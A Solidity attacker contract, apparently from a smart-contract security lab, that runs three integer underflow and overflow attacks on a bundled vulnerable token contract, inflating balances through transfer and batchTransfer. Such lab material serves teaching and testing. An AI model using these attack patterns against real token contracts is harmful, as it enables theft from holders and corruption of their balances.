// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../vulnerable/OverflowVulnerable.sol";

contract OverflowAttacker {
    OverflowVulnerable public target;
    
    event AttackExecuted(string attackType, bool success);
    event BalanceManipulated(address account, uint256 balanceBefore, uint256 balanceAfter);
    
    constructor(address _target) {
        target = OverflowVulnerable(_target);
    }
    
    // Attack 1: Underflow attack to get massive balance
    function underflowAttack() external {
        uint256 balanceBefore = target.balanceOf(address(this));
        
        // Try to transfer more than we have to cause underflow
        // This will underflow and give us a huge balance
        try target.transfer(msg.sender, 1) {
            uint256 balanceAfter = target.balanceOf(address(this));
            emit BalanceManipulated(address(this), balanceBefore, balanceAfter);
            emit AttackExecuted("Underflow", true);
        } catch {
            emit AttackExecuted("Underflow", false);
        }
    }
    
    // Attack 2: Batch transfer overflow attack
    function batchOverflowAttack() external {
        // Create arrays that will cause overflow in totalAmount calculation
        address[] memory recipients = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        
        recipients[0] = address(0x1);
        recipients[1] = address(0x2);
        
        // These amounts will overflow when added together
        amounts[0] = type(uint256).max - 100;
        amounts[1] = 200; // This will cause overflow: (max-100) + 200 = 99
        
        uint256 balanceBefore = target.balanceOf(address(this));
        
        try target.batchTransfer(recipients, amounts) {
            uint256 balanceAfter = target.balanceOf(address(this));
            emit BalanceManipulated(address(this), balanceBefore, balanceAfter);
            emit AttackExecuted("BatchOverflow", true);
        } catch {
            emit AttackExecuted("BatchOverflow", false);
        }
    }
    
    // Attack 3: Recipient balance overflow
    function recipientOverflowAttack(address victim) external {
        // First, we need the victim to have close to max balance
        // Then transfer to cause overflow in their balance
        
        uint256 victimBalanceBefore = target.balanceOf(victim);
        uint256 attackerBalanceBefore = target.balanceOf(address(this));
        
        // Transfer amount that would cause overflow in victim's balance
        uint256 transferAmount = type(uint256).max - victimBalanceBefore + 1;
        
        try target.transfer(victim, transferAmount) {
            uint256 victimBalanceAfter = target.balanceOf(victim);
            uint256 attackerBalanceAfter = target.balanceOf(address(this));
            
            emit BalanceManipulated(victim, victimBalanceBefore, victimBalanceAfter);
            emit BalanceManipulated(address(this), attackerBalanceBefore, attackerBalanceAfter);
            emit AttackExecuted("RecipientOverflow", true);
        } catch {
            emit AttackExecuted("RecipientOverflow", false);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return target.balanceOf(address(this));
    }
}